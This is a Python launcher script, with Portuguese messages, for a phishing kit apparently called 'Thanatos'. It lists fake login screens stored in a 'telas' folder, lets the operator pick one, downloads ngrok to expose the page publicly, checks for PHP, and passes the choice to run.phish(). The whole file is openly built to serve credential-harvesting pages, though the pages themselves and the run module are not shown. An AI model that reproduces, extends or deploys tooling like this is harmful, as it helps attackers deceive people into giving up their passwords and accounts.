#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os,time,sys,run
try:
	import ui
except Exception as error:
	print('Erro no Thanatos.');sys.exit()
try:
	import run
except Exception as error:
	print('Erro no arquivo de execução');sys.exit()

servidor = None
if os.path.exists('telas'):
	telas = os.listdir('telas')
	size_telas = len(telas)
	if size_telas < 2:
		ui.error_dialog(' sem telas suficientes para usar ');sys.exit()
	else:
		menu = ''
		for tela in range(0,size_telas):
			menu = menu + str(telas[tela]) + '\n'
		menu = menu + 'Sair'
else:
	ui.error_dialog(' sem telas suficientes para usar ');os.system('mkdir telas');sys.exit()
sair = size_telas + 1
	
ui.clear() # INICIO

if __name__ == '__main__':
	if len(sys.argv) <= 1:
		pass
	else:
		run.phish(sys.argv[1]);sys.exit()
	if os.path.exists('ngrok'):
		pass
	else:
		ui.dialog(' baixando ngrok '); result = os.popen('chmod +x * && ./get_ngrok.sh').read(); sys.exit()
	if 'dpkg-query' not in (os.popen('dpkg -l php').read()): # Por hora serve apenas para debian-based
		pass
	else:
		ui.error_dialog(' instale o php \n pkg install php ');sys.exit()
	while (servidor == None):
		choice = int(ui.menu(menu))
		if choice == sair:
			print("Pediu pra sair kkk");sys.exit()
		elif choice <= size_telas:
			choice = choice - 1
			servidor = telas[choice]
		else:
			pass
	print('Tela escolhida: '+servidor);input()
	run.phish(servidor)
else:
	print('Esse script não pode ser importado atualmente.');sys.exit()
